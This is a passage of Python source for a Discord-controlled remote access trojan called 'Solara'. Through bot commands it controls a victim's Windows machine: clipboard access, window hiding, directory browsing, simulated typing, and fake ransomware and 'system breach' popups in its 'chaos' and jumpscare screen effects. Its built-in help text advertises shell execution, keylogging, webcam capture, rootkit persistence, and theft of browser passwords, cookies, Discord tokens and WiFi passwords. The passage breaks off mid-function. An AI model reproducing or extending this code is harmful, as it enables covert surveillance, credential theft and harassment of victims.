                    title = win32gui.GetWindowText(hwnd)
                    if title:
                        results.append((hwnd, title))
            win32gui.EnumWindows(enum_windows, windows)

            embed = discord.Embed(
                title="🪟 Active Windows",
                color=SOLARA_BLUE
            )

            window_list = "\n".join(f"{hwnd}: {title}" for hwnd, title in windows[:20])
            embed.add_field(name="Windows", value=f"```\n{window_list}\n```")

            await ctx.send(embed=embed)

        elif action == 'hide':
            active = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(active, win32con.SW_HIDE)
            await ctx.send("✅ Window hidden")

        elif action == 'minimize':
            active = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(active, win32con.SW_MINIMIZE)
            await ctx.send("✅ Window minimized")

    except Exception as e:
        await ctx.send(f"Window control error: {str(e)}")

@_c.command(name='network')
async def network_info(ctx):
    """Get detailed network information"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        embed = discord.Embed(
            title="🌐 Network Information",
            color=SOLARA_BLUE
        )

        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            addresses = []
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    addresses.append(f"IPv4: {addr.address}")
                elif addr.family == socket.AF_INET6:
                    addresses.append(f"IPv6: {addr.address}")

            if addresses:
                embed.add_field(
                    name=f"📡 {interface}",
                    value="\n".join(addresses),
                    inline=False
                )

        net_io = psutil.net_io_counters()
        embed.add_field(
            name="📊 Network Usage",
            value=f"""
            Bytes Sent: {net_io.bytes_sent/1024/1024:.2f} MB
            Bytes Received: {net_io.bytes_recv/1024/1024:.2f} MB
            Packets Sent: {net_io.packets_sent}
            Packets Received: {net_io.packets_recv}
            """,
            inline=False
        )

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Network error: {str(e)}")

@_c.command(name='cd')
async def change_directory(ctx, *, path=None):
    """Change current working directory"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if path is None:

            current_dir = os.getcwd()
            embed = discord.Embed(
                title="📂 Current Directory",
                description=f"`{current_dir}`",
                color=SOLARA_BLUE
            )
            await ctx.send(embed=embed)
            return

        if path == "~":
            path = os.path.expanduser("~")
        elif path == "..":
            path = os.path.dirname(os.getcwd())

        os.chdir(path)
        new_dir = os.getcwd()

        items = os.listdir()
        folders = [f for f in items if os.path.isdir(f)]
        files = [f for f in items if os.path.isfile(f)]

        embed = discord.Embed(
            title="📂 Directory Changed",
            description=f"New location: `{new_dir}`",
            color=SOLARA_PURPLE
        )

        if folders:
            embed.add_field(
                name="📁 Folders",
                value=f"Count: {len(folders)}\nSample: {', '.join(folders[:5])}...",
                inline=False
            )

        if files:
            embed.add_field(
                name="📄 Files",
                value=f"Count: {len(files)}\nSample: {', '.join(files[:5])}...",
                inline=False
            )

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Directory Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='detailedhelp', aliases=['dhelp'])
async def detailed_help(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        detailed_help_text = f"""✨ {BOT_NAME} Remote Access - Detailed Command Guide ✨

SYSTEM CONTROL
-------------
!shell <command> (alias: !cmd, !run)
    Execute system commands on target machine
    Example: !shell ipconfig

!processes (alias: !ps)
    Lists top 15 running processes sorted by CPU usage
    Shows: Name, PID, CPU%, Memory%

!kill <pid>
    Terminates process by Process ID
    Example: !kill 1234

!blacklist <process_name>
    Add process to blacklist for auto-termination
    Example: !blacklist notepad.exe

!whitelist <process_name>
    Remove process from blacklist
    Example: !whitelist notepad.exe

!blacklist-status
    Show current process blacklist

!persist
    Implements multiple persistence methods:
    - Copies to multiple system locations
    - Adds registry run entries
    - Sets hidden attributes

!startup
    Add to Windows startup

!status
    Show real-time system status:
    - CPU usage and frequency
    - Memory usage
    - Disk space
    - Network traffic
    - System uptime

!info (alias: !system)
    Show detailed system information:
    - Session ID, Hostname
    - Public/Local IPs
    - OS, Architecture
    - Username, Location

!services <action> [name]
    Manage Windows services
    Actions: list, start, stop, restart
    Example: !services stop Spooler

!windows <action>
    Control windows on target
    Actions: list, hide, minimize
    Example: !windows hide

!block-input
    Block keyboard and mouse input

!unblock-input
    Restore keyboard and mouse input

!timetraveler [hours=X] [days=Y]
    Sets the system clock back or forward
    Example: !timetraveler hours=5
    Example: !timetraveler days=-2

!shutdown [delay] [force]
    Shutdown the system
    Example: !shutdown 30 true (30 sec delay, force)

!reboot [delay] [force]
    Restart the system
    Example: !reboot 10 true (10 sec delay, force)

!logoff [force]
    Log off the current user
    Example: !logoff true (force)

!cancel
    Cancel pending shutdown/reboot

!destroy
    Remove all traces of the program from the system
    - Removes persistence files
    - Cleans registry entries
    - Restores modified system files
    - Removes scheduled tasks

!rootkit
    Install advanced stealth and persistence mechanisms
    - DLL hijacking for critical system processes
    - Deep registry persistence
    - System service installation
    - WMI event subscription
    - Multiple file system hiding locations

FILE OPERATIONS
--------------
!files [path] (alias: !dir, !ls)
    Quick directory listing
    Example: !files C:\\Users

!browse [path]
    Detailed file browser with sizes and dates
    Example: !browse Documents

!cd [path]
    Change current working directory
    Example: !cd C:\\Users

!download <path> (alias: !dl)
    Download file from target system
    Handles files up to 8MB, splits larger files
    Example: !download report.pdf

!install <url> [filename]
    Download file from URL to target
    Example: !install http://example.com/file.exe

!wallpaper <url/path>
    Set system wallpaper
    Supports: PNG, JPG, JPEG, BMP

MONITORING & SURVEILLANCE
-----------------------
!screenshot (alias: !screen, !sc)
    Capture current screen contents
    Saves and uploads automatically

!screenrec [duration] (alias: !record, !rec)
    Record screen for specified duration
    Default: 15 seconds
    Example: !screenrec 30

!webcam
    Capture image from default webcam
    Requires OpenCV module

!keylog <action> (alias: !kl)
    Keyboard input monitoring
    Actions: start, stop, status
    Example: !keylog start

!locate
    Get geolocation data:
    - City, Region, Country
    - ISP, Timezone
    - GPS Coordinates

!network
    Show network information:
    - Network interfaces
    - IP addresses
    - Traffic statistics

!ip
    Get detailed IP address information:
    - Public IP
    - Local IPs
    - Geolocation data
    - MAC address

!advancedinfo (alias: !fullinfo, !sysinfo)
    Collect comprehensive system information:
    - Detailed hardware specs
    - Network configuration
    - User information
    - Security settings
    - WiFi passwords
    - Recent activity

!getdiscordinfo
    Retrieve Discord tokens and info

!browserstuff
    Extract browser data:
    - Cookies
    - History
    - Bookmarks
    - Saved passwords

!getwifipass
    Retrieve saved WiFi passwords

!passwords
    Retrieve saved browser passwords

!minecraft
    Recover Minecraft session data

!roblox
    Extract Roblox cookies

VISUAL EFFECTS & PRANKS
---------------------
!notepad [text]
    Open Notepad and write specified text
    Example: !notepad Hello World

!website <url>
    Open a website in the user's browser
    Example: !website google.com

!snake [duration]
    Animate desktop icons in a snake pattern
    Default: 30 seconds
    Example: !snake 15

!tts <text>
    Basic text-to-speech
    Example: !tts Hello World

!message <text>
    Display message box on target
    Example: !message System Update Required

!say <voice> <text>
    Advanced text-to-speech with voice styles
    Voices: normal, slow, fast, deep
    Example: !say slow Hello World

!volume <level>
    Set system volume (0-100)
    Example: !volume 50

!brightness <level>
    Set screen brightness (0-100)
    Example: !brightness 75

!rickroll
    Opens Never Gonna Give You Up in browser

!jumpscare
    Shows fullscreen scary image with sound

!meltscreen [duration]
    Creates melting screen effect
    Duration: 1-30 seconds
    Example: !meltscreen 15

!chaos [duration]
    Creates complete system chaos:
    - Multiple screen effects
    - Random error popups
    - Glitch sounds
    - Screen melting/tearing
    - Color inversions
    Example: !chaos 10

!matrix [duration]
    Create Matrix-style rain effect
    Example: !matrix 10

!invert [duration]
    Invert screen colors
    Example: !invert 5

!flash [times]
    Flash screen white/black
    Example: !flash 5

!glitch [duration]
    Create digital glitch effect
    Example: !glitch 5

!bonk [times]
    Make mouse run away from cursor
    Example: !bonk 5

!earthquake [duration]
    Shake entire screen violently
    Example: !earthquake 5

!drunk [duration]
    Make screen appear drunk
    Example: !drunk 10

!disco [duration]
    Turn screen into a disco party
    Example: !disco 10

!gravity [duration]
    Make screen content fall with gravity
    Example: !gravity 10

!dodge [message]
    Create popup that dodges mouse
    Example: !dodge Catch me!

!funmode [duration]
    Fun visual effects without chaos
    Example: !funmode 10

UTILITIES
--------
!mouse <action> [params]
    Mouse control:
    - move <x> <y>: Move to coordinates
    - click: Click at current position
    - position: Get current coordinates

!clipboard [text]
    Without text: Get clipboard content
    With text: Set clipboard content
    Example: !clipboard Hello World

!type <text>
    Simulate typing on target machine
    Example: !type Hello World

HELP COMMANDS
------------
!help
    Show basic command list

!detailedhelp (alias: !dhelp)
    Show this detailed command guide

!help_timetraveler
    Show detailed help for the timetraveler command

For any command, you can get more help by typing !help_commandname
Example: !help_timetraveler"""

        with open("detailed_help.txt", "w", encoding='utf-8') as f:
            f.write(detailed_help_text)

        embed = discord.Embed(
            title="📚 Detailed Help Guide",
            description="Comprehensive command list has been generated",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )

        await ctx.send(
            embed=embed,
            file=discord.File("detailed_help.txt", "detailed_help.txt")
        )

        try:
            os.remove("detailed_help.txt")
        except:
            pass

    except Exception as e:
        await ctx.send(f"Detailed help error: {str(e)}")

@_c.command(name='help')
async def simple_help(ctx):
    if ctx.author.id != OWNER_ID:
        return

    try:
        help_text = f"""✨ {BOT_NAME} Remote Access - Command List ✨

SYSTEM CONTROL:
!shell (cmd, run) - Execute system command
!processes (ps) - List running processes
!kill <pid> - Terminate process
!blacklist <process> - Add process to blacklist
!whitelist <process> - Remove from blacklist
!blacklist-status - View blacklist
!persist - Enable persistence
!startup - Add to startup
!status - System resource usage
!info (system) - System information
!services - Manage Windows services
!windows - Control windows
!block-input - Block keyboard/mouse
!unblock-input - Restore input
!timetraveler - Manipulate system clock
!shutdown - Shutdown system
!reboot - Restart system
!logoff - Log off user
!cancel - Cancel shutdown/reboot
!destroy - Remove all traces
!rootkit - Install advanced persistence

FILE OPERATIONS:
!files (dir, ls) - List directory contents
!browse - File browser interface
!cd - Change directory
!download (dl) - Download target file
!install - Download from URL
!wallpaper - Set system wallpaper

MONITORING:
!screenshot (screen, sc) - Take screenshot
!screenrec (record, rec) - Record screen
!webcam - Take webcam photo
!keylog (kl) - Keyboard monitoring
!info - System information
!locate - Get geolocation
!network - Network information
!status - Resource usage
!ip - IP address information
!advancedinfo (fullinfo, sysinfo) - Comprehensive system info
!getdiscordinfo - Get Discord info
!browserstuff - Extract browser data
!getwifipass - Get WiFi passwords
!passwords - Get browser passwords
!minecraft - Get Minecraft data
!roblox - Get Roblox cookies

VISUAL EFFECTS & PRANKS:
!notepad - Open notepad with text
!website - Open website in browser
!snake - Animate desktop icons
!tts - Text-to-speech
!message - Show message box
!say - Advanced TTS voices
!volume - Set system volume
!brightness - Screen brightness
!rickroll - Browser rickroll
!jumpscare - Scare effect
!meltscreen - Melting effect
!chaos - Total chaos mode
!matrix - Matrix rain effect
!invert - Invert colors
!flash - Flash screen
!glitch - Glitch effect
!bonk - Mouse dodge
!earthquake - Screen shake
!drunk - Drunk effect
!disco - Disco party
!gravity - Screen gravity
!dodge - Dodging popup
!funmode - Fun effects

UTILITIES:
!mouse - Control mouse
!clipboard - Clipboard access
!type - Remote typing
!help - Show this help
!detailedhelp (dhelp) - Detailed command guide
!help_timetraveler - Help for time traveler command

For detailed help use !detailedhelp"""

        with open("help.txt", "w", encoding='utf-8') as f:
            f.write(help_text)

        embed = discord.Embed(
            title="📚 Help Guide",
            description="Command list has been generated",
            color=SOLARA_PURPLE,
            timestamp=discord.utils.utcnow()
        )

        await ctx.send(
            embed=embed,
            file=discord.File("help.txt", "help.txt")
        )

        try:
            os.remove("help.txt")
        except:
            pass

    except Exception as e:
        await ctx.send(f"Help error: {str(e)}")

@_c.command(name='clipboard')
async def clipboard_control(ctx, *, text=None):
    """Get or set clipboard content"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        import pyperclip

        if text:
            pyperclip.copy(text)
            embed = discord.Embed(
                title="📋 Clipboard Updated",
                description=f"Set clipboard to:\n```\n{text[:1000]}\n```",
                color=SOLARA_PURPLE
            )
        else:
            content = pyperclip.paste()
            embed = discord.Embed(
                title="📋 Clipboard Content",
                description=f"```\n{content[:1900]}\n```",
                color=SOLARA_BLUE
            )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Clipboard error: {str(e)}")

@_c.command(name='wallpaper')
async def set_wallpaper(ctx):
    """Set wallpaper from attached image"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if not ctx.message.attachments:
            await ctx.send("Please attach an image!")
            return

        attachment = ctx.message.attachments[0]
        if not attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg', '.bmp')):
            await ctx.send("Please attach a valid image file!")
            return

        image_data = await attachment.read()
        temp_path = "solara_wallpaper.png"

        img = Image.open(BytesIO(image_data))
        img.save(temp_path)

        ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(temp_path), 3)

        embed = discord.Embed(
            title="🖼️ Wallpaper Updated",
            description="Successfully changed system wallpaper",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

        os.remove(temp_path)

    except Exception as e:
        await ctx.send(f"Wallpaper error: {str(e)}")

@_c.command(name='message')
async def show_message(ctx, *, message):
    """Show message box on target system"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        thread = threading.Thread(
            target=lambda: ctypes.windll.user32.MessageBoxW(
                0, message, "System Message", 0x40
            )
        )
        thread.daemon = True
        thread.start()

        embed = discord.Embed(
            title="💬 Message Displayed",
            description=f"Showing message:\n```\n{message}\n```",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Message error: {str(e)}")

@_c.command(name='tts')
async def text_to_speech(ctx, *, text=None):
    """Play text-to-speech on target"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if text is None:
            embed = discord.Embed(
                title="🔊 TTS Command Help",
                description="Text-to-speech command",
                color=SOLARA_BLUE
            )
            embed.add_field(
                name="Usage",
                value="!tts <text>",
                inline=False
            )
            embed.add_field(
                name="Example",
                value="!tts Hello World",
                inline=False
            )
            await ctx.send(embed=embed)
            return

        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        engine.stop()

        await ctx.send(f"🔊 Played: {text}")

    except Exception as e:
        await ctx.send(f"TTS error: {str(e)}")

@_c.command(name='say')
async def speak_text(ctx, voice: str = None, *, text: str = None):
    """Speak text with different voice styles"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if voice is None or text is None:
            embed = discord.Embed(
                title="🗣️ Say Command Help",
                description="Speaks text using different voice styles",
                color=SOLARA_BLUE
            )
            embed.add_field(
                name="Usage",
                value="!say <voice> <text>",
                inline=False
            )
            embed.add_field(
                name="Voice Options",
                value="• normal\n• slow\n• fast\n• deep",
                inline=False
            )
            embed.add_field(
                name="Example",
                value="!say slow Hello World",
                inline=False
            )
            await ctx.send(embed=embed)
            return

        if voice not in ['normal', 'slow', 'fast', 'deep']:
            await ctx.send("❌ Invalid voice style! Options: normal, slow, fast, deep")
            return

        engine = pyttsx3.init()

        if voice == 'slow':
            engine.setProperty('rate', 100)
        elif voice == 'fast':
            engine.setProperty('rate', 200)
        elif voice == 'deep':
            engine.setProperty('volume', 0.8)
            engine.setProperty('pitch', 50)

        engine.say(text)
        engine.runAndWait()
        engine.stop()

        await ctx.send(f"🗣️ Spoke text in {voice} voice")

    except Exception as e:
        await ctx.send(f"Speech error: {str(e)}")

@_c.command(name='volume')
async def volume_control(ctx, level: int = None):
    """Set system volume (0-100)"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        if level is None:
            embed = discord.Embed(
                title="🔊 Volume Command Help",
                description="Sets the system volume level",
                color=SOLARA_BLUE
            )
            embed.add_field(
                name="Usage",
                value="!volume <level>",
                inline=False
            )
            embed.add_field(
                name="Parameters",
                value="level: Number between 0-100",
                inline=False
            )
            embed.add_field(
                name="Example",
                value="!volume 50",
                inline=False
            )
            await ctx.send(embed=embed)
            return

        if not 0 <= level <= 100:
            await ctx.send("❌ Volume must be between 0 and 100!")
            return

        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        scalar = level / 100.0
        volume.SetMasterVolumeLevelScalar(scalar, None)

        embed = discord.Embed(
            title="🔊 Volume Changed",
            description=f"Set system volume to {level}%",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Volume error: {str(e)}")

@_c.command(name='rickroll')
async def rickroll(ctx):
    """Open rickroll in browser"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

        embed = discord.Embed(
            title="🎵 Never Gonna Give You Up",
            description="Target has been rickrolled!",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"Rickroll error: {str(e)}")

@_c.command(name='jumpscare')
async def jumpscare(ctx):
    """Full screen jumpscare image"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        pygame.init()
        pygame.font.init()

        info = pygame.display.Info()
        screen_width = info.current_w
        screen_height = info.current_h

        os.environ['SDL_VIDEO_WINDOW_POS'] = '0,0'
        screen = pygame.display.set_mode((screen_width, screen_height), pygame.NOFRAME)
        pygame.display.set_caption('System Update')

        screen.fill((0, 0, 0))  

        face_color = (255, 0, 0)  
        pygame.draw.circle(screen, face_color, (screen_width//2, screen_height//2), min(screen_width, screen_height)//3)

        eye_color = (0, 0, 0)  
        eye_radius = min(screen_width, screen_height)//10
        pygame.draw.circle(screen, eye_color, (screen_width//2 - eye_radius*2, screen_height//2 - eye_radius), eye_radius)
        pygame.draw.circle(screen, eye_color, (screen_width//2 + eye_radius*2, screen_height//2 - eye_radius), eye_radius)

        mouth_points = [
            (screen_width//2 - eye_radius*2, screen_height//2 + eye_radius),
            (screen_width//2, screen_height//2 + eye_radius*2),
            (screen_width//2 + eye_radius*2, screen_height//2 + eye_radius)
        ]
        pygame.draw.lines(screen, eye_color, False, mouth_points, eye_radius//2)

        try:

            font_size = min(screen_width, screen_height) // 10
            font = pygame.font.SysFont('Arial', font_size, bold=True)

            text_surface = font.render("SOLARA", True, (255, 255, 255))
            text_surface.set_alpha(180)  

            text_rect = text_surface.get_rect(center=(screen_width//2, screen_height//4))

            screen.blit(text_surface, text_rect)
        except:
            pass  

        try:
            hwnd = pygame.display.get_wm_info()['window']
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, screen_width, screen_height, 
                                win32con.SWP_SHOWWINDOW)
        except:
            pass

        pygame.display.flip()

        try:
            pygame.mixer.init()
            pygame.mixer.music.load("data/scream.mp3")
            pygame.mixer.music.play()
        except:
            pass

        for _ in range(30):  
            pygame.event.pump()
            pygame.time.wait(100)

        pygame.mixer.quit()
        pygame.quit()

        embed = discord.Embed(
            title="👻 Jumpscare Executed",
            description="Target has been spooked!",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Jumpscare Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='meltscreen')
async def melt_screen(ctx, duration: int = 10):
    """Create a melting screen effect"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        duration = min(max(1, duration), 30)

        embed = discord.Embed(
            title="🌊 Screen Melt Started",
            description=f"Melting screen for {duration} seconds",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)

        hdc = user32.GetDC(0)

        start_time = time.time()
        melt_height = 0

        while time.time() - start_time < duration:

            pt = POINT()
            user32.GetCursorPos(byref(pt))

            melt_width = random.randint(50, 200)
            melt_pos = random.randint(0, screen_width - melt_width)
            melt_height += random.randint(1, 5)

            if melt_height > screen_height:
                melt_height = 0

            windll.gdi32.BitBlt(
                hdc, 
                melt_pos, 
                1,
                melt_width, 
                screen_height, 
                hdc,
                melt_pos, 
                0,
                0x00CC0020  
            )

            time.sleep(0.01)

        user32.ReleaseDC(0, hdc)

        embed = discord.Embed(
            title="🌊 Screen Melt Complete",
            description=f"Screen melted for {duration} seconds",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Melt Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='chaos')
async def chaos_mode(ctx, duration: int = 10):
    """Create absolute chaos on target system"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        duration = min(max(1, duration), 30)

        embed = discord.Embed(
            title="💀 Chaos Mode Initiated",
            description=f"Unleashing chaos for {duration} seconds",
            color=SOLARA_ERROR
        )
        await ctx.send(embed=embed)

        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)

        hdc = user32.GetDC(0)

        pygame.init()
        pygame.mixer.init()

        error_messages = [
            "⚠️ SYSTEM BREACH DETECTED - DATA BEING ENCRYPTED",
            "❌ CRITICAL FAILURE: MEMORY CORRUPTION DETECTED",
            "⚠️ WARNING: SYSTEM FILES BEING DELETED",
            "💀 FATAL ERROR: SYSTEM MELTDOWN IN PROGRESS",
            "🔓 SECURITY COMPROMISED - ALL FILES EXPOSED",
            "⚡ KERNEL PANIC: SYSTEM UNSTABLE",
            "🔥 CPU TEMPERATURE CRITICAL - SHUTDOWN IMMINENT",
            "☢️ MALWARE DETECTED - SPREADING TO ALL DRIVES",
            "⚠️ BIOS CORRUPTION DETECTED - HARDWARE AT RISK",
            "💾 HARD DRIVE FAILURE - DATA LOSS IMMINENT",
            "🌐 NETWORK COMPROMISED - IP EXPOSED",
            "🔒 RANSOMWARE DETECTED - ENCRYPTION STARTED",
            "⚡ POWER SURGE DETECTED - HARDWARE DAMAGE LIKELY",
            "🔥 SYSTEM OVERLOAD - THERMAL PROTECTION FAILED",
            "☠️ FATAL EXCEPTION - SYSTEM CANNOT RECOVER"
        ]

        start_time = time.time()

        def popup_thread():
            while time.time() - start_time < duration:
                try:
                    msg = random.choice(error_messages)
                    thread = threading.Thread(
                        target=lambda: ctypes.windll.user32.MessageBoxW(
                            0, msg, "System Error", 0x10
                        )
                    )
                    thread.daemon = True
                    thread.start()
                    time.sleep(random.uniform(0.5, 2))
                except:
                    pass

        threading.Thread(target=popup_thread, daemon=True).start()

        while time.time() - start_time < duration:
            effect = random.randint(0, 6)

            if effect == 0:  
                melt_width = random.randint(50, 400)
                melt_pos = random.randint(0, screen_width - melt_width)
                windll.gdi32.BitBlt(
                    hdc, melt_pos, 1, melt_width, screen_height,
                    hdc, melt_pos, 0, 0x00CC0020
                )

            elif effect == 1:  
                wave_height = random.randint(10, 50)
                for x in range(0, screen_width, 100):
                    windll.gdi32.BitBlt(
                        hdc, x, int(math.sin(time.time() * 10 + x/100) * wave_height),
                        100, screen_height,
                        hdc, x, 0, 0x00CC0020
                    )

            elif effect == 2:  
                shake_x = random.randint(-20, 20)
                shake_y = random.randint(-20, 20)
                windll.gdi32.BitBlt(
                    hdc, shake_x, shake_y, screen_width, screen_height,
                    hdc, 0, 0, 0x00CC0020
                )

            elif effect == 3:  
                windll.gdi32.BitBlt(
                    hdc, 0, 0, screen_width, screen_height,
                    hdc, 0, 0, 0x00550009
                )

            elif effect == 4:  
                center_x = screen_width // 2
                center_y = screen_height // 2
                angle = time.time() * 5
                dx = int(math.cos(angle) * 20)
                dy = int(math.sin(angle) * 20)
                windll.gdi32.BitBlt(
                    hdc, center_x + dx, center_y + dy, screen_width//2, screen_height//2,
                    hdc, center_x, center_y, 0x00CC0020
                )

            elif effect == 5:  
                tear_height = random.randint(0, screen_height)
                tear_offset = random.randint(-50, 50)
                windll.gdi32.BitBlt(
                    hdc, tear_offset, tear_height, screen_width, screen_height - tear_height,
                    hdc, 0, tear_height, 0x00CC0020
                )

            if random.random() < 0.1:  
                try:
                    freq = random.randint(500, 2000)
                    duration_ms = random.randint(50, 200)
                    winsound.Beep(freq, duration_ms)
                except:
                    pass

            time.sleep(0.05)

        user32.ReleaseDC(0, hdc)

        embed = discord.Embed(
            title="💀 Chaos Complete",
            description="System returned to normal",
            color=SOLARA_PURPLE
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(embed=discord.Embed(
            title="❌ Chaos Error",
            description=str(e),
            color=SOLARA_ERROR
        ))

@_c.command(name='funmode')
async def fun_mode(ctx, duration: int = 10):
    """Fun visual effects without being too chaotic"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        duration = min(max(1, duration), 30)

        embed = discord.Embed(
            title="🎉 Fun Mode Activated",
            description=f"Running fun effects for {duration} seconds",
            color=SOLARA_PINK
        )
        await ctx.send(embed=embed)

        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        start_time = time.time()
        while time.time() - start_time < duration:
            effect = random.randint(0, 2)

            if effect == 0:  
                for x in range(0, screen_width, 100):
                    y_offset = int(math.sin(time.time() * 5 + x/100) * 20)
                    windll.gdi32.BitBlt(
                        hdc, x, y_offset, 100, screen_height,
                        hdc, x, 0, 0x00CC0020
                    )

            elif effect == 1:  
                angle = time.time() * 2
                dx = int(math.cos(angle) * 10)
                dy = int(math.sin(angle) * 10)
                windll.gdi32.BitBlt(
                    hdc, dx, dy, screen_width, screen_height,
                    hdc, 0, 0, 0x00CC0020
                )

            elif effect == 2:  
                if random.random() < 0.1:
                    windll.gdi32.BitBlt(
                        hdc, 0, 0, screen_width, screen_height,
                        hdc, 0, 0, 0x00550009
                    )

            time.sleep(0.05)

        user32.ReleaseDC(0, hdc)
        await ctx.send("✨ Fun mode complete!")

    except Exception as e:
        await ctx.send(f"Fun mode error: {str(e)}")

@_c.command(name='type')
async def fake_typing(ctx, *, text):
    """Simulate typing on target machine"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        import pyautogui
        pyautogui.write(text, interval=0.1)
        await ctx.send(f"✨ Typed: {text}")
    except Exception as e:
        await ctx.send(f"Typing error: {str(e)}")

@_c.command(name='brightness')
async def set_brightness(ctx, level: int):
    """Set screen brightness (0-100)"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        try:
            screen_brightness_control.set_brightness(level)
        except ImportError:
            await ctx.send("⚠️ Please install screen-brightness-control: `pip install screen-brightness-control`")
            return

        await ctx.send(f"🔆 Brightness set to {level}%")
    except Exception as e:
        await ctx.send(f"Brightness error: {str(e)}")

@_c.command(name='flash')
async def flash_screen(ctx, times: int = 5):
    """Flash screen white/black"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        for _ in range(times):

            windll.gdi32.BitBlt(
                hdc, 0, 0, screen_width, screen_height,
                hdc, 0, 0, 0x00FF0062  
            )
            time.sleep(0.1)

            windll.gdi32.BitBlt(
                hdc, 0, 0, screen_width, screen_height,
                hdc, 0, 0, 0x00000042  
            )
            time.sleep(0.1)

        user32.ReleaseDC(0, hdc)
        await ctx.send("💡 Screen flashed!")

    except Exception as e:
        await ctx.send(f"Flash error: {str(e)}")

@_c.command(name='glitch')
async def glitch_effect(ctx, duration: int = 5):
    """Create digital glitch effect"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        start_time = time.time()
        while time.time() - start_time < duration:

            for _ in range(10):
                x = random.randint(0, screen_width-100)
                y = random.randint(0, screen_height-100)
                w = random.randint(50, 200)
                h = random.randint(10, 50)
                dx = random.randint(-20, 20)

                windll.gdi32.BitBlt(
                    hdc, x + dx, y, w, h,
                    hdc, x, y, 0x00CC0020
                )
            time.sleep(0.05)

        user32.ReleaseDC(0, hdc)
        await ctx.send("📺 Glitch effect complete!")

    except Exception as e:
        await ctx.send(f"Glitch error: {str(e)}")

@_c.command(name='matrix')
async def matrix_effect(ctx, duration: int = 10):
    """Create Matrix-style effect"""
    if ctx.author.id != OWNER_ID:
        return

    try:

        pygame.init()

        screen_info = pygame.display.Info()
        width, height = screen_info.current_w, screen_info.current_h

        screen = pygame.display.set_mode((width, height), pygame.FULLSCREEN | pygame.NOFRAME)
        pygame.display.set_caption("System Update")

        set_window_fullscreen_focus(screen)

        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*"
        font = pygame.font.SysFont('courier', 14)

        columns = width // 14
        drops = [random.randint(-height, 0) for _ in range(columns)]

        start_time = time.time()
        while time.time() - start_time < duration:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    break

            screen.fill((0, 0, 0))

            for i in range(columns):
                char = random.choice(chars)
                text = font.render(char, True, (0, 255, 0))
                screen.blit(text, (i * 14, drops[i]))

                if drops[i] > height:
                    drops[i] = random.randint(-20, 0)
                drops[i] += 14

            pygame.display.flip()
            pygame.time.wait(50)

        pygame.quit()
        await ctx.send("🖥️ Matrix effect complete!")

    except Exception as e:
        try:
            pygame.quit()
        except:
            pass
        await ctx.send(f"Matrix error: {str(e)}")

@_c.command(name='invert')
async def invert_colors(ctx, duration: int = 5):
    """Invert screen colors"""
    if ctx.author.id != OWNER_ID:
        return

    try:
        user32 = windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)

        start_time = time.time()
        while time.time() - start_time < duration:
